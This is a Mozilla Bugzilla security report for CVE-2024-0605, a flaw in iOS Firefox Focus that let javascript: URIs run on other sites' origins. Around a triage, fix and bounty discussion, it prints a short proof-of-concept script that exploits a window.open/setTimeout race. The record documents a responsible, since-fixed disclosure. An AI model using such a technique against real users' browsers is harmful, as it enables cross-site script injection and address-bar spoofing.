=== Content from bugzilla.mozilla.org_63e260cd_20250115_081803.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1855575)
* [XML](/show_bug.cgi?ctype=xml&id=1855575)

Closed
[Bug 1855575](/show_bug.cgi?id=1855575)
(CVE-2024-0605)

Opened 1 year ago
Closed 1 year ago

# iOS Firefox Focus let javascript: URI to run on Top Origin sites

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

iOS Firefox Focus let javascript: URI to run on Top Origin sites

## Categories

### (Focus :: Security: iOS, defect)

[Product:](/describecomponents.cgi?product=Focus)

Focus
▾

Focus
For bugs in Firefox Focus for Android. Bugs in Firefox Focus for iOS should be filed on [GitHub](https://github.com/mozilla-mobile/firefox-ios/issues/new/choose)
[See Open Bugs in This Product](/buglist.cgi?product=Focus&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Focus)
Watch This Product

[Component:](/describecomponents.cgi?product=Focus&component=Security%3A%20iOS#Security%3A%20iOS)

Security: iOS
▾

Focus :: Security: iOS
Security bugs in Focus for iOS. Other Focus for iOS bugs should be filed at <https://github.com/mozilla-mobile/focus-ios/issues>
[See Open Bugs in This Component](/buglist.cgi?product=Focus&component=Security%3A%20iOS&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Focus&component=Security%3A%20iOS&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Focus&component=Security%3A%20iOS)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Firefox 122

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### (firefox122+ fixed)

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Priority | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| Accessibility Severity | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox122 | [+](/buglist.cgi?f1=cf_tracking_firefox122&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox122&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| fxios | --- |  |
| relnote-firefox |  | --- |
| firefox122 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: proof131072, Assigned: lmarceau)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/7fb2b1922d97306f98551a6d1db2768a?d=mm&size=40)  [lmarceau](/user_profile?user_id=694570)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/302893eb3990c528336f2ee08964bfa5?d=mm&size=40)  [proof131072](/user_profile?user_id=619332)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/481f85b35d45ebad6d41f98cae68ccbf?d=mm&size=40)  [jeevans](/user_profile?user_id=654438)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

15 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

[CVE-2024-0606](/show_bug.cgi?id=1855030 "VERIFIED FIXED - iOS Firefox Focus UXSS")

Dependency [tree](/showdependencytree.cgi?id=1855575&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1855575)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2024-0606](/show_bug.cgi?id=1855030 "VERIFIED FIXED - iOS Firefox Focus UXSS")

[github.com/mozilla-mobile/focus-ios/p...](https://github.com/mozilla-mobile/focus-ios/pull/3930 "https://github.com/mozilla-mobile/focus-ios/pull/3930")

[mozilla-hub.atlassian.net/browse/FXIO...](https://mozilla-hub.atlassian.net/browse/FXIOS-7774 "https://mozilla-hub.atlassian.net/browse/FXIOS-7774")

## Details

### (Keywords: csectype-sop, reporter-external, sec-critical, Whiteboard: [reporter-external] [client-bounty-form] [verif?])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2024-0605

[Keywords:](/describekeywords.cgi)

[csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?]

QA Whiteboard:

---

Change Request:

---

Bug Flags:

| [freddy](/user_profile?user_id=428608) | [sec-bounty](#a10784838_428608 "1 year ago") | + |
| --- | --- | --- |
| [freddy](/user_profile?user_id=428608) | sec-bounty | + |
| --- | --- | --- |
|  | sec-bounty-hof |  |
| --- | --- | --- |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (8 files)

| [Focus\_jsuritop.mp4](/attachment.cgi?id=9355440)  [1 year ago](#c0)  [James Lee](/user_profile?user_id=619332)   5.96 MB, video/mp4 |  | [Details](/attachment.cgi?id=9355440&action=edit) |
| --- | --- | --- |
| [1855575.html](/attachment.cgi?id=9359359)  [1 year ago](#c10)  [James Lee](/user_profile?user_id=619332)   260 bytes, text/html |  | [Details](/attachment.cgi?id=9359359&action=edit) |
| [1855575\_2.html](/attachment.cgi?id=9359428)  [1 year ago](#c12)  [James Lee](/user_profile?user_id=619332)   244 bytes, text/html |  | [Details](/attachment.cgi?id=9359428&action=edit) |
| [1855575\_2.html](/attachment.cgi?id=9359430)  [1 year ago](#c14)  [James Lee](/user_profile?user_id=619332)   264 bytes, text/html |  | [Details](/attachment.cgi?id=9359430&action=edit) |
| [GitHub Pull Request](/attachment.cgi?id=9371147)  [1 year ago](#c27)  [lmarceau](/user_profile?user_id=694570)   53 bytes, text/x-github-pull-request |  | [Details](/attachment.cgi?id=9371147&action=edit) | [Review](/attachment.cgi?id=9371147) |
| [1855575\_test.html](/attachment.cgi?id=9372742)  [1 year ago](#c31)  [James Lee](/user_profile?user_id=619332)   412 bytes, text/html |  | [Details](/attachment.cgi?id=9372742&action=edit) |
| [RPReplay\_Final1704970853.mp4](/attachment.cgi?id=9372743)  [1 year ago](#c32)  [James Lee](/user_profile?user_id=619332)   4.96 MB, video/mp4 |  | [Details](/attachment.cgi?id=9372743&action=edit) |
| [advisory.txt](/attachment.cgi?id=9373324)  [1 year ago](#c37)  [lmarceau](/user_profile?user_id=694570)   326 bytes, text/plain |  | [Details](/attachment.cgi?id=9373324&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | Multiple Authors |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1855575#c0)• 1 year ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1855575&comment_id=16596524 "1 revision") |
|  | |

Attached video
[Focus\_jsuritop.mp4](attachment.cgi?id=9355440)
— [Details](attachment.cgi?id=9355440&action=edit)

We are able to run javascript: URI on Top Origin sites using race condition attack with setTimeout().

I used <https://facebook.com> as an example demo for this test case.

PoC demo: <https://pwning.click/jsuritop.php>

```
<script>
function a(){
	window.open('https://facebook.com', 'x');
	setTimeout(function(){
		window.open('javascript:document.write(document.domain)');
	}, 555);
}
</script>
<center><img src="https://pwning.click/Genius_Cat.jpg" onclick="a()"></center>

```
Flags: sec-bounty?

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a55_406194)• 1 year ago |

Group: firefox-core-security → mobile-core-securityComponent: Security → Security: iOSProduct: Firefox → Focus

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a567786_159069)• 1 year ago |

See Also: → [CVE-2024-0606](/show_bug.cgi?id=1855030 "VERIFIED FIXED - iOS Firefox Focus UXSS")

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1855575#c1)• 1 year ago |
|  | |

You can reproduce it continuously after second try (this is different to 1855030)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a600313_1689)• 1 year ago |

Keywords: [csectype-sop](/buglist.cgi?keywords=csectype-sop&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1855575#c2)• 1 year ago |
|  | |

You've framed your specific examples differently, but they both come down to "Focus only has one window, so window.open('javascript') does the wrong thing"

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1855575#c3)• 1 year ago |
|  | |

Wasn't able to reproduce this using Focus on an iPad. Shouldn't be different from running the app on an iPhone, but maybe it is?

I suspect it needs a longer timeout

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1855575#c4)• 1 year ago |
|  | |

Did you reload and try to tap on Genius Cat one more time? this works after second try. If you already did that please try to change setTimeout() to 777 and so on, 500 ~ 1111 range.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1855575#c5)• 1 year ago |
|  | |

I also can't reproduce. Sorry, but we need a better testcase.

Happy to reopen on new information, of course.

Status: NEW → RESOLVEDClosed: 1 year agoResolution: --- → WORKSFORME

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1855575#c6)• 1 year ago |
|  | |

Were you guys able to reproduce <https://bugzilla.mozilla.org/show_bug.cgi?id=1855030> ? I believe that worked for both of you.

And this is the reason why I believe this issue is different to 1855030 by the way-- you need to tap on the URL bar to reproduce it unlike that issue.

Please check the demo video I uploaded, when you test if the URL shows nothing but you are on <https://facebook.com> then you've successfully reproduced (on second try) and only thing you should do after that is to tap and run URL.

I believe this part makes the difference between these two.

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1855575#c7)• 1 year ago |
|  | |

If "empty URL" with <https://facebook.com> part also can't be reproduced to verify this, then please let me know. Testing with same PoC on second try should work.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1855575#c8)• 1 year ago |
|  | |

I looked at the video. It seems that you need to tap into the address bar to confirm / perform the UXSS, is that correct?

From what I see in the video

* Go to evil page
* click on button to trigger popup opening (malicious page could skip this)
* Focus opens Facebook and the address bar now contains a JS URL
* Confirming the JS URL executes the JS payloads on Facebook

That's annoying but hardly a UXSS given the steps involved.

Also, I can not confirm what I see in the video when trying locally. Can you make sure this still reproduces and if not, let us know which version you used for testing?

Flags: needinfo?(proof131072)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1855575#c9)• 1 year ago |
|  | |

That's correct, it should work on second time you tap on the image (try once and come back to the page and tap it again to repro)

I believe this is separate to 1855030 and sec-moderate bug for that reason.

In the mean time, please let me know if you were able to reproduce <https://bugzilla.mozilla.org/show_bug.cgi?id=1855030>

Flags: needinfo?(proof131072)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1855575#c10)• 1 year ago |
|  | |

Attached file
[1855575.html](attachment.cgi?id=9359359)
— [Details](attachment.cgi?id=9359359&action=edit)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1855575#c11)• 1 year ago |
|  | |

I don't know how it works locally but I can confirm it works with website so I attached a test file.

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1855575#c12)• 1 year ago |
|  | |

Attached file
[1855575\_2.html](attachment.cgi?id=9359428)
— [Details](attachment.cgi?id=9359428&action=edit)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1855575#c13)• 1 year ago |
|  | |

I believe this case should not have timing issue to repro

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1855575#c14)• 1 year ago |
|  | |

Attached file
[1855575\_2.html](attachment.cgi?id=9359430)
— [Details](attachment.cgi?id=9359430&action=edit)

Image link was not fully added

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1855575#c15)• 1 year ago |
|  | |

Comment on [attachment 9359428](/attachment.cgi?id=9359428 "1855575_2.html") [[details]](/attachment.cgi?id=9359428&action=edit "1855575_2.html")
1855575\_2.html
><script>
>function a(){
> window.open('<https://google.com/csi>', 'x');
> setTimeout(function(){
> window.open('javascript:document.write(document.domain)');
> }, 111);
>}
></script>
><center><img src="<https://pwning.click/Genius_Cat.jpg>" onclick="a()"></center>

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1855575#c16)• 1 year ago |
|  | |

I never mentioned this is UXSS anywhere in this report; but <https://bugzilla.mozilla.org/show_bug.cgi?id=1855030> is.

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1855575#c17)• 1 year ago |
|  | |

1855575\_2.html should repro this.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1855575#c18)• 1 year ago |
|  | |

Does this need reopening per the last few comments? (I'd ping Freddy but AIUI he's on vacation at the moment)

Flags: needinfo?(continuation)

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1855575#c19)• 1 year ago |
|  | |

I don't have an iOS device to test this, but let's err on the side of reopening.

Status: RESOLVED → REOPENEDFlags: needinfo?(continuation)Resolution: WORKSFORME → ---

|  | [Nishant Bhasin](/user_profile?user_id=651766) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1855575#c20)• 1 year ago |
|  | |

I am on iOS 17 with Focus v119 and nothing loads related to Facebook, tried the pwning.click link by tapping the cat image but no luck. Are there any other steps to reproduce or in a different version?

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1855575#c21)• 1 year ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1855575&comment_id=16679524 "1 revision") |
|  | |

That means this has been successfully reproduced, I changed from <https://facebook.com> to <https://google.com/csi> as you can check from #c15 so document.domain is <https://google.com> when you run loaded javascript URI on the address bar.

We need someone from Mozilla Security Team to confirm urgent critical ones like

[bug 1855030](/show_bug.cgi?id=1855030 "VERIFIED FIXED - iOS Firefox Focus UXSS")

[bug 1855117](/show_bug.cgi?id=1855117 "NEW")

[bug 1860075](/show_bug.cgi?id=1860075 "RESOLVED FIXED - iOS Firefox Focus 302 redirect UXSS")

[bug 1863831](/show_bug.cgi?id=1863831 "RESOLVED FIXED - Full UXSS via opening Firefox Focus externally after silent background navigation")

[bug 1863832](/show_bug.cgi?id=1863832 "RESOLVED FIXED")

|  | [Nishant Bhasin](/user_profile?user_id=651766) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1855575#c22)• 1 year ago |
|  | |

Is the main issue then is that you are able to run js from the urlbar and that should be prevented?

Can any type of js run from the urlbar?

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1855575#c23)• 1 year ago |
|  | |

Yes, that's correct and other issues I pasted above are UXSS without running javascript URI from address bar like this issue so they're more urgent for confirmation and fix.

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1855575#c24)• 1 year ago |
|  | |

From the url bar on any sites and that's the problem. In this case we're running javascript URI on <https://google.com> origin.

|  | [Nishant Bhasin](/user_profile?user_id=651766) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1855575#c25)• 1 year ago |
|  | |

James, I added a comment in the other bug to understand the severity and proper steps to reproduce

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1855575#c26)• 1 year ago |
|  | |

I updated the PoC file and step to reproduce, thanks!

|  | [lmarceau](/user_profile?user_id=694570)  Assignee |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1855575#c27)• 1 year ago |
|  | |

Attached file
[GitHub Pull Request](attachment.cgi?id=9371147)
— [Details](attachment.cgi?id=9371147&action=edit)

Assignee: nobody → lmarceau

|  | [lmarceau](/user_profile?user_id=694570)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a8539738_694570)• 1 year ago |

Version: unspecified → Firefox 122

|  | [Andrei Bodea[:andrei]](/user_profile?user_id=616105) |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1855575#c28)• 1 year ago |
|  | |

Hello, can someone help me with some steps on what needs to be verified here?

I wanna verify the fix and I wanna see how it was before and how it's now to make sure I verify it correctly.

|  | [Nishant Bhasin](/user_profile?user_id=651766) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1855575#c29)• 1 year ago |
|  | |

I will ping you with steps [:andrei]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a8911888_1689)• 1 year ago |

See Also: → <https://github.com/mozilla-mobile/focus-ios/pull/3930>,
<https://mozilla-hub.atlassian.net/browse/FXIOS-7774>

|  | [Andrei Bodea[:andrei]](/user_profile?user_id=616105) |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=1855575#c30)• 1 year ago |
|  | |

Verified as fixed on v9000 (17517) with iPhone 15 Pro (17.1.2).

Please note that there was no JS on the URL.

After tapping on the genius cat there was a redirection to the google.com without issues.

Status: REOPENED → RESOLVEDClosed: 1 year ago → 1 year agoResolution: --- → FIXED

|  | [Andrei Bodea[:andrei]](/user_profile?user_id=616105) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a8941045_616105)• 1 year ago |

Status: RESOLVED → VERIFIED

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a9051919_75935)• 1 year ago |

Group: mobile-core-security → core-security-release

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=1855575#c31)• 1 year ago |
|  | |

Attached file
[1855575\_test.html](attachment.cgi?id=9372742)
— [Details](attachment.cgi?id=9372742&action=edit)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=1855575#c32)• 1 year ago |
|  | |

Attached video
[RPReplay\_Final1704970853.mp4](attachment.cgi?id=9372743)
— [Details](attachment.cgi?id=9372743&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a9564794_578488)• 1 year ago |

Alias: CVE-2024-0605

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a9577192_1689)• 1 year ago |

Blocks: [CVE-2024-0606](/show_bug.cgi?id=1855030 "VERIFIED FIXED - iOS Firefox Focus UXSS")

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=1855575#c33)• 1 year ago |
|  | |

Looking at this and [Bug 1855030](/show_bug.cgi?id=1855030 "VERIFIED FIXED - iOS Firefox Focus UXSS") - it seems like these patches are symbiotic - you need both patches to fix this issue; and this issue can manifest in different ways, but one fix resolves both of them. If this is correct, we should only assign one CVE.

Flags: needinfo?(lmarceau)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=1855575#c34)• 1 year ago |
|  | |

Congratulations James, this bug qualifies for our higher UXSS bounty award

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=1855575#c35)• 1 year ago |
|  | |

Thanks for letting me know Dan, but I have to clarify that this is not Full UXSS but it's javascript URI running based UXSS with address bar spoof issue as we can check from <https://bugzilla.mozilla.org/attachment.cgi?id=9372743>, which is different to <https://bugzilla.mozilla.org/show_bug.cgi?id=1855030> .

So it is correct to assign separate CVE and this is probably low-end sec-high at the best due to convincing link with spoof leading to UXSS.

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=1855575#c36)• 1 year ago |
|  | |

For the reference, <https://bugzilla.mozilla.org/show_bug.cgi?id=1863838> need to be checked too, before this gets addressed.

|  | [lmarceau](/user_profile?user_id=694570)  Assignee |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=1855575#c37)• 1 year ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9373324)
— [Details](attachment.cgi?id=9373324&action=edit)

Flags: needinfo?(lmarceau)

|  | [lmarceau](/user_profile?user_id=694570)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=1855575#c38)• 1 year ago |
|  | |

[Tracking Requested - why for this release]:

[status-firefox122](/buglist.cgi?f1=cf_status_firefox122&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox122&o1=equals&v1=fixed)
[tracking-firefox122](/buglist.cgi?f1=cf_tracking_firefox122&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox122&o1=equals&v1=%3F)

|  | [Donal Meehan [:dmeehan]](/user_profile?user_id=695136) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a9676666_695136)• 1 year ago |

[tracking-firefox122](/buglist.cgi?f1=cf_tracking_firefox122&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox122&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox122&o1=equals&v1=%2B)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=1855575#c39)• 1 year ago |
|  | |

There are lot's of reports that the only required step to reproduce is tapping on cat image, why are they never being checked? Is there anything I can help on them?

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=1855575#c40)• 1 year ago |
|  | |

That [bug 1863838](/show_bug.cgi?id=1863838 "RESOLVED FIXED") is also one of them.

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1855575#c41)• 1 year ago |
|  | |

Hi, could you let me know when you can check it? thanks!

Flags: needinfo?(lmarceau)

|  | [lmarceau](/user_profile?user_id=694570)  Assignee |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1855575#c42)• 1 year ago |
|  | |

Could you comment on the related bug instead of this one? It would be ideal not to mix tickets. As for the "when" this will be worked on, I don't have an answer. We have triaging process undergoing. Thank you!

Flags: needinfo?(lmarceau)

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1855575#c43)• 1 year ago |
|  | |

This is different bug class but that can be impacted by the fix, which is why I'm mentioning here (same for the 1855030 fix btw) and there are several reports that should be checked before 122 release as either it won't work anymore or I might have to provide other test cases, which is not ideal neither since they're different bug class to bugs that have been fixed and release on stable soon.

|  | [lmarceau](/user_profile?user_id=694570)  Assignee |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1855575#c44)• 1 year ago |
|  | |

Version 122 was released today. What do you mean by `bug class` ?

|  | [James Lee](/user_profile?user_id=619332)  Reporter |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1855575#c45)• 1 year ago |
|  | |

I see, I thought that was going to happen tomorrow or so but it's already done. That report was sent nearly 3 months ago and it's high severity since it's complete address bar spoof. However, without the report being reviewed, we can't talk about it anymore especially if 122 is already released, that bug is different bug class (address bar spoof) to UXSS but that might've impacted by the fix, which means we needed someone to test and verify that before 122 release. I'll let you know in that report about that.

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a10784838_428608)• 1 year ago |

Flags: sec-bounty? → sec-bounty+

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a21235975_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1855575#a30613839_1689)• 4 months ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1855575&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [James Lee](/user_profile?user_id=619332)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_21136f47_20250115_081804.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
